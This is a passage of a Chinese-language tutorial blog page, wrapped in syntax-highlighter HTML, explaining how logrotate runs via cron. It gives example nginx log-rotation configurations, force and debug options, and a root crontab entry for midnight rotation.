class=\"crayon-o\">/</span><span class=\"crayon-v\">cron</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">weekly</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c71273435449-9\"><span class=\"crayon-cn\">52</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">    </span><span class=\"crayon-e\">root    </span><span class=\"crayon-v\">test</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">anacron</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">parts</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">report</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cron</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">monthly</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0045 seconds] -->\r\n<p>可以看出来了只要是在</p>\n<ul>\n<li>/etc/cron.daily/ 下面的任务都是每天6：25 执行</li>\n<li>/etc/cron.weekly/ 下面的任务都是每周日 6：47 执行</li>\n<li>/etc/cron.monthly/ 下面的任务都是每月1号 6：52 执行</li>\n</ul>\n<p>如果等不及cron自动执行日志轮转，想手动强制切割日志，需要加-f参数；<br>\n不过正式执行前最好通过Debug选项来验证一下（-d参数），这对调试也很重要</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd526b1c75165640190\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/sbin/logrotate -f /etc/logrotate.d/nginx  // 未到时间或者未到切割条件，强制切割\r\n# /usr/sbin/logrotate -d -f /etc/logrotate.d/nginx // 输出切割debug信息</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c75165640190-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c75165640190-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd526b1c75165640190-1\"><span class=\"crayon-p\"># /usr/sbin/logrotate -f /etc/logrotate.d/nginx  // 未到时间或者未到切割条件，强制切割</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c75165640190-2\"><span class=\"crayon-p\"># /usr/sbin/logrotate -d -f /etc/logrotate.d/nginx // 输出切割debug信息</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>那么至此，我们就知道logrotate是如何实现自动切割日志的</p>\n<h3>logrotate配置案例</h3>\n<p>nginx 常用日志切割配置</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd526b1c79539145518\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/data/log/nginx/*.log /data/log/nginx/*/*.log { # 对匹配上的日志文件进行切割\r\n    weekly # 每周切割\r\n    missingok     # 在日志轮循期间，任何错误将被忽略，例如“文件无法找到”之类的错误。\r\n    rotate 6      # 保留 6 个备份\r\n    compress     # 压缩\r\n    delaycompress    # delaycompress 和 compress 一起使用时，转储的日志文件到下一次转储时才压缩\r\n    notifempty     # 如果是空文件的话，不转储\r\n    create 0644 www-data ymserver     # mode owner group 转储文件，使用指定的文件模式创建新的日志文件\r\n    sharedscripts # 下面详细说\r\n    prerotate # 在logrotate转储之前需要执行的指令，例如修改文件的属性等动作；必须独立成行\r\n        if [ -d /etc/logrotate.d/httpd-prerotate ]; then \\\r\n            run-parts /etc/logrotate.d/httpd-prerotate; \\\r\n        fi \\\r\n    endscript\r\n    postrotate  # 在logrotate转储之后需要执行的指令，例如重新启动 (kill -HUP) 某个服务！必须独立成行\r\n        [ -s /run/nginx.pid ] &amp;&amp; kill -USR1 `cat /run/nginx.pid`\r\n    endscript\r\n    su root ymserver # 轮训日志时切换设置的用户/用户组来执行（默认是root），如果设置的user/group 没有权限去让文件容用 create 选项指定的拥有者 ，会触发错误。\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c79539145518-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c79539145518-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c79539145518-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c79539145518-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c79539145518-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c79539145518-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c79539145518-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c79539145518-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c79539145518-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c79539145518-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c79539145518-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c79539145518-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c79539145518-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c79539145518-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c79539145518-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c79539145518-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c79539145518-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c79539145518-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c79539145518-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd526b1c79539145518-1\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-c\">/*.log /data/log/nginx/*/</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># 对匹配上的日志文件进行切割</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c79539145518-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">weekly</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># 每周切割</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c79539145518-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">missingok</span><span class=\"crayon-h\">     </span><span class=\"crayon-p\"># 在日志轮循期间，任何错误将被忽略，例如“文件无法找到”之类的错误。</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c79539145518-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">rotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\">      </span><span class=\"crayon-p\"># 保留 6 个备份</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c79539145518-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">compress</span><span class=\"crayon-h\">     </span><span class=\"crayon-p\"># 压缩</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c79539145518-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">delaycompress</span><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># delaycompress 和 compress 一起使用时，转储的日志文件到下一次转储时才压缩</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c79539145518-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">notifempty</span><span class=\"crayon-h\">     </span><span class=\"crayon-p\"># 如果是空文件的话，不转储</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c79539145518-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">create</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0644</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">www</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">data </span><span class=\"crayon-v\">ymserver</span><span class=\"crayon-h\">     </span><span class=\"crayon-p\"># mode owner group 转储文件，使用指定的文件模式创建新的日志文件</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c79539145518-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">sharedscripts</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># 下面详细说</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c79539145518-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">prerotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># 在logrotate转储之前需要执行的指令，例如修改文件的属性等动作；必须独立成行</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c79539145518-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">httpd</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">prerotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c79539145518-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">parts</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">httpd</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">prerotate</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c79539145518-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">fi</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c79539145518-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">endscript</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c79539145518-15\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">postrotate</span><span class=\"crayon-h\">  </span><span class=\"crayon-p\"># 在logrotate转储之后需要执行的指令，例如重新启动 (kill -HUP) 某个服务！必须独立成行</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c79539145518-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">USR1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pid</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c79539145518-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">endscript</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c79539145518-18\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">su </span><span class=\"crayon-e\">root </span><span class=\"crayon-v\">ymserver</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># 轮训日志时切换设置的用户/用户组来执行（默认是root），如果设置的user/group 没有权限去让文件容用 create 选项指定的拥有者 ，会触发错误。</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c79539145518-19\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0035 seconds] -->\r\n<p>如果要配置一个每日0点执行切割任务，怎么做到？我们的logrotate默认每天执行时间已经写到了/etc/cron.daily/目录下面，而这个目录下面的任务执行时间上面也说了，在/etc/crontab里面定义了时6：25。我之前就有个这样的需求，看看下面的配置</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd526b1c7d346940079\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/data/log/owan_web/chn_download_stat/chn_app_rec.log {\r\n    copytruncate\r\n    # weekly 注释了 但是会继承/etc/logrorate.conf的全局变量，也是weekly\r\n    missingok\r\n    rotate 10\r\n    compress\r\n    delaycompress\r\n    size=1000M # 大小到达size开始转存\r\n    notifempty\r\n    create 664 www-data ymserver\r\n    su root\r\n    dateext       //这个参数很重要！就是切割后的日志文件以当前日期为格式结尾，如xxx.log-20131216这样,如果注释掉,切割出来是按数字递增,即前面说的 xxx.log-1这种格式\r\n    compress      //是否通过gzip压缩转储以后的日志文件，如xxx.log-20131216.gz ；如果不需要压缩，注释掉就行\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c7d346940079-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c7d346940079-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c7d346940079-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c7d346940079-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c7d346940079-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c7d346940079-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c7d346940079-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c7d346940079-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c7d346940079-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c7d346940079-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c7d346940079-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c7d346940079-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c7d346940079-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c7d346940079-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd526b1c7d346940079-1\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">owan_web</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">chn_download_stat</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">chn_app_rec</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c7d346940079-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">copytruncate</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c7d346940079-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># weekly 注释了 但是会继承/etc/logrorate.conf的全局变量，也是weekly</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c7d346940079-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">missingok</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c7d346940079-5\"><span class=\"crayon-e\">    </span><span class=\"crayon-i\">rotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c7d346940079-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">compress</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c7d346940079-7\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">delaycompress</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c7d346940079-8\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1000M</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># 大小到达size开始转存</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c7d346940079-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">notifempty</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c7d346940079-10\"><span class=\"crayon-e\">    </span><span class=\"crayon-i\">create</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">664</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">www</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">data </span><span class=\"crayon-e\">ymserver</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c7d346940079-11\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">su </span><span class=\"crayon-e\">root</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c7d346940079-12\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">dateext</span><span class=\"crayon-h\">       </span><span class=\"crayon-c\">//这个参数很重要！就是切割后的日志文件以当前日期为格式结尾，如xxx.log-20131216这样,如果注释掉,切割出来是按数字递增,即前面说的 xxx.log-1这种格式</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c7d346940079-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">compress</span><span class=\"crayon-h\">      </span><span class=\"crayon-c\">//是否通过gzip压缩转储以后的日志文件，如xxx.log-20131216.gz ；如果不需要压缩，注释掉就行</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c7d346940079-14\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>然后去root的crontab配置一个0点执行的任务</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd526b1c83520219652\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nwwwadm@host:/etc/logrotate.d$ sudo crontab -l -u root\r\n0 0 * * * /usr/sbin/logrotate /etc/logrotate.d/web_roteate -fv  &gt;/tmp/logro.log 2&gt;&amp;1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c83520219652-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c83520219652-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd526b1c83520219652-1\"><span class=\"crayon-v\">wwwadm</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">d</span><span 